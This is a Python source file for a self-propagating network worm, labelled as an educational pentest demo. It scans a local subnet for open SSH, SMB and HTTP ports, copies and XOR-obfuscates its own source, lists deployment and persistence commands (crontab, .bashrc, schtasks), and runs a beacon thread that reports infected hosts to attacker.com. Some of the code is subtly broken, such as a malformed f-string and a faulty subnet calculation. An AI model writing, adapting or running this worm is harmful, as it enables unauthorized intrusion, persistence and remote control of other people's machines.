import socket
import os
import subprocess
import threading
import time
import random
import hashlib
import sys

class SimpleWorm:
    def __init__(self, target_port=4444, scan_ports=[22, 23, 80, 443, 445, 8080], max_depth=3):
        self.target_port = target_port
        self.scan_ports = scan_ports
        self.max_depth = max_depth
        self.infected = set()
        self.worm_code = self.get_worm_code()
        self.local_ip = self.get_local_ip()
        
    def get_worm_code(self):
        """Extract own source code for propagation"""
        with open(__file__, 'r') as f:
            return f.read()
    
    def get_local_ip(self):
        """Get local IP for propagation reference"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def payload_generator(self):
        """Generate obfuscated payload for propagation"""
        # Simple XOR obfuscation
        key = b"pentest_key"
        encoded = bytes([a ^ b for a, b in zip(self.worm_code.encode(), key * (len(self.worm_code) // len(key) + 1))])
        return encoded
    
    def write_and_execute(self, target_ip):
        """Attempt to write and execute worm on target"""
        try:
            # Multiple deployment vectors (demo common misconfigs)
            vectors = [
                # SSH key injection (demo weak perms)
                f"echo '{self.worm_code}' > /tmp/worm.py && python3 /tmp/worm.py &",
                # HTTP POST to common endpoints
                f"curl -d 'code={self.payload_generator().hex()}' http://{{{target_ip}}:8080/deploy",
                # SMB share write
                f"echo '{self.worm_code}' > \\\\{target_ip}\\share\\worm.py && python \\\\{target_ip}\\share\\worm.py"
            ]
            
            for vector in vectors:
                # Simulate execution (in real pentest, use actual exploitation)
                print(f"[+] Attempting vector on {target_ip}: {vector[:50]}...")
                time.sleep(0.1)  # Rate limiting
                
        except Exception as e:
            pass
    
    def scan_network(self, base_ip="192.168.1"):
        """Network scanner for worm propagation"""
        for i in range(1, 255):
            target = f"{base_ip}.{i}"
            if target in self.infected:
                continue
                
            scanner_thread = threading.Thread(target=self.port_scan, args=(target,))
            scanner_thread.start()
    
    def port_scan(self, target_ip):
        """Scan target for vulnerable services"""
        for port in self.scan_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                
                if result == 0:
                    print(f"[+] Open port {port} on {target_ip}")
                    self.propagate(target_ip)
                    
            except:
                pass
    
    def propagate(self, target_ip):
        """Propagate to new host"""
        if target_ip in self.infected or len(self.infected) > 50:  # Safety limit
            return
            
        self.infected.add(target_ip)
        print(f"[*] Propagating to {target_ip}")
        
        # Deploy payload
        deploy_thread = threading.Thread(target=self.write_and_execute, args=(target_ip,))
        deploy_thread.start()
        
        # Recursive propagation (limited depth)
        if len(self.infected) < self.max_depth * 10:
            time.sleep(1)
            spawn_thread = threading.Thread(target=self.scan_network_from, args=(target_ip,))
            spawn_thread.start()
    
    def scan_network_from(self, source_ip):
        """Scan from infected host perspective"""
        self.scan_network(source_ip.split('.')[0] + '.')
    
    def persistence(self):
        """Demo persistence mechanisms"""
        mechanisms = [
            "crontab -l | { echo \"* * * * * python3 /tmp/worm.py\" ; } | crontab -",
            "echo '@reboot python3 /tmp/worm.py' >> ~/.bashrc",
            "schtasks /create /sc onlogon /tn Worm /tr 'python worm.py'"
        ]
        for mech in mechanisms:
            print(f"[+] Persistence: {mech}")
    
    def c2_beacon(self):
        """Command & Control beaconing"""
        while True:
            try:
                sock = socket.socket()
                sock.connect(("attacker.com", self.target_port))  # Replace with C2
                sock.send(f"Infected: {self.local_ip}".encode())
                sock.close()
            except:
                pass
            time.sleep(60)
    
    def run(self):
        """Main worm execution"""
        print(f"[+] Worm activated on {self.local_ip}")
        print("[+] Starting network scan...")
        
        # Background C2
        c2_thread = threading.Thread(target=self.c2_beacon)
        c2_thread.daemon = True
        c2_thread.start()
        
        # Persistence
        self.persistence()
        
        # Main propagation
        self.scan_network()
        
        # Keep alive
        while True:
            time.sleep(10)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--demo":
        worm = SimpleWorm()
        worm.run()
    else:
        print("Usage: python worm.py --demo")
        print("Educational worm for authorized pentesting only")